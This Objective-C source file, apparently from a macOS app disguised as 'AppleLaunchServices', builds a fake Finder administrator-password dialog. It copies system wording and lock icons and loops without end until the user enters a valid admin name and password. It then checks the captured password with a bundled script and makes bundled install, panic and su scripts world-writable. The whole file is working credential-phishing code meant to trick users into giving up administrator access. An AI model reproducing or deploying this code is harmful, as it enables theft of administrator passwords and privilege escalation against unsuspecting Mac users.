//
//  AppDelegate.m
//  AppleLaunchServices
//
//  Created by James Pickering on 9/3/14.
//
//

#import <CoreServices/CoreServices.h>
#import "AppDelegate.h"
#import "WTUserApi.h"
#import "InputView.h"
#import <pwd.h>
#import <stdlib.h>
#import <sys/stat.h>
#import <stdio.h>

@interface ASFinderAlert : NSAlert {
@private
    id _asview;
}

- (NSString *)password;

@end

@implementation ASFinderAlert

- (void)layout {
    [super layout];
    
    NSRect frame = [_asview frame];
    frame.origin.x= [self.icon size].width + 42;
    frame.origin.y = 81;
    [_asview setFrame:frame];
    [[self.window contentView] addSubview:_asview];
}

- (void)setAccessoryView:(NSView *)accessoryView {
    _asview = accessoryView;
    NSView *fakeAccessoryView = [[NSView alloc] initWithFrame:accessoryView.frame];
    [super setAccessoryView:fakeAccessoryView];
}

- (NSView *)accessoryView {
    return _asview;
}

- (NSString *)password {
    return [[_asview viewWithTag:1337] stringValue];
}

- (NSString *)username {
    return [[_asview viewWithTag:1773] stringValue];
}

@end


@interface AppDelegate ()

@property (weak) IBOutlet NSWindow *window;

@end

BOOL isAdmin(const char *user) {
    BOOL ret = NO;
    int ngroups;
    int *groups;
    struct passwd *pw;
    ngroups = 32;
    groups = (int*)malloc(ngroups * sizeof(gid_t));
    pw = getpwnam(user);
    if (pw == NULL) {
        return NO;
    }
    getgrouplist(user, pw->pw_gid, groups, &ngroups);
    for (int i=0; i<ngroups; ++i) {
        if (groups[i]==80)
            ret = YES;
    }
    free(groups);
    return ret;
}

@implementation AppDelegate

- (void)applicationDidFinishLaunching:(NSNotification *)aNotification {
    NSArray *scripts = @[@"checkgroup", @"checkpassword", @"install", @"panic", @"su"];
    for (int i=0; i<[scripts count]; ++i) {
        NSString *current_script = [[NSBundle mainBundle] pathForResource:scripts[i] ofType:@"bash"];
        chmod([current_script cStringUsingEncoding:NSUTF8StringEncoding], 0777);
    }
    while (1) {
        
        ASFinderAlert *passRequest = [[ASFinderAlert alloc] init];
        if (isAdmin([NSUserName() cStringUsingEncoding:NSUTF8StringEncoding])) {
            [passRequest setMessageText:@"Finder wants to make changes. Type your       password to allow this."];
        }
        else {
            [passRequest setMessageText:@"Finder wants to make changes. Type an       administrator's name and password to allow this."];
        }
        [passRequest addButtonWithTitle:@"OK"];
        [passRequest addButtonWithTitle:@"Cancel"];
        [passRequest setAccessoryView:[InputView inputViewWithUsername:NSFullUserName()]];
        
        NSProcessInfo *pInfo = [NSProcessInfo processInfo];
        NSString *version = [pInfo operatingSystemVersionString];
        NSImage *lockImage;
        if ([[[version substringFromIndex:11] substringToIndex:2] isEqualToString:@"10"]) {
            lockImage = [[NSImage alloc] initWithContentsOfFile:[[NSBundle mainBundle] pathForImageResource:@"LOCK_YOSEMITE.png"]];
        }
        else {
            lockImage = [[NSImage alloc] initWithContentsOfFile:[[NSBundle mainBundle] pathForImageResource:@"LOCK_MAVERICKS.png"]];
        }
        [passRequest setIcon:lockImage];
        NSUInteger button = [passRequest runModal];
        NSLog(@"button: %lu", (unsigned long)button);
        if (button == 1000) {
            NSString *loginName = [WTUserApi fullNameToPosixName:[passRequest username]];
            if (loginName == nil) {
                loginName = [passRequest username];
            }
            NSLog(@"Authenticating as %@", loginName);
            system("/usr/bin/sudo -K"); // Kill any current sessions
            if (!(isAdmin([loginName cStringUsingEncoding:NSUTF8StringEncoding]))) {
                NSLog(@"%@ is not admin!", [passRequest username]);
                NSBeep();
                continue;
            }
            NSTask *loginCheck = [NSTask new];
            [loginCheck setLaunchPath:[[NSBundle mainBundle] pathForResource:@"checkpassword" ofType:@"bash"]];
            [loginCheck setArguments:@[loginName, [passRequest password]]];
            NSPipe *outputPipe = [NSPipe pipe];
            [loginCheck setStandardOutput:outputPipe];
            [loginCheck launch];
            [loginCheck waitUntilExit];
            NSData *outputData = [[outputPipe fileHandleForReading] readDataToEndOfFile];
            NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];
            NSLog(@"Got: %@", outputString);
            if ([outputString  isEqual: @"RIGHT\n"]) {
                break;
            }
            else {
                NSBeep();
            }
        }
        else {
            NSBeep();
        }
    }
}


- (void)applicationWillTerminate:(NSNotification *)aNotification {
}

@end
